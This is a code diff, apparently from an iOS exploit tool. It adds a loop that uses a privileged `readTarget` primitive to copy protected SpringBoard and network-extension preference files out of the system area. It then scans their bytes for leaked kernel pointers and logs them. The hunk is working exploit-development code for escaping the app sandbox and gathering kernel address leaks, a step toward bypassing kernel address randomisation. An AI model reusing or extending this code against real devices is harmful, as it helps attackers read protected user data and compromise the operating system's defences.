@@ -468,6 +468,33 @@ static NSString *KPBSSHA256(NSData *data) {
                 [session log:@"ROOT_SCAN data=%lu bytes", (unsigned long)fileData.length];
                 const uint8_t *bytes = (const uint8_t *)fileData.bytes;
                 NSUInteger len = fileData.length;
+        // Read additional protected files
+        NSArray *extraPaths = @[
+            @"/private/var/mobile/Library/Preferences/com.apple.springboard.plist",
+            @"/private/var/mobile/Library/Preferences/com.apple.networkextension.plist",
+        ];
+        for (NSString *ep in extraPaths) {
+            NSString *outName = [@"bytestream-extra-" stringByAppendingString:ep.lastPathComponent];
+            NSURL *outURL = [NSURL fileURLWithPath:[documents stringByAppendingPathComponent:outName]];
+            BOOL eRead = [session readTarget:ep output:outURL];
+            [session log:@"EXTRA_READ %@ success=%d", ep, eRead];
+            if (eRead) {
+                NSData *eData = [NSData dataWithContentsOfURL:outURL];
+                if (eData) {
+                    const uint8_t *eb = (const uint8_t *)eData.bytes;
+                    NSUInteger el = eData.length;
+                    int ek = 0;
+                    for (NSUInteger j = 0; j + 8 <= el; j += 4) {
+                        uint64_t ev = *(const uint64_t *)(eb + j);
+                        if ((ev >> 32) >= 0xffffffe0ULL) {
+                            ek++;
+                            if (ek <= 3) [session log:@"  EXTRA_KPTR @ +%lu = 0x%llx", (unsigned long)j, ev];
+                        }
+                    }
+                    [session log:@"EXTRA_SCAN %@ : size=%lu kptrs=%d", ep, (unsigned long)el, ek];
+                }
+            }
+        }
                 int kptrCount = 0;
                 for (NSUInteger i = 0; i + 8 <= len; i += 4) {
                     uint64_t v = *(const uint64_t *)(bytes + i);
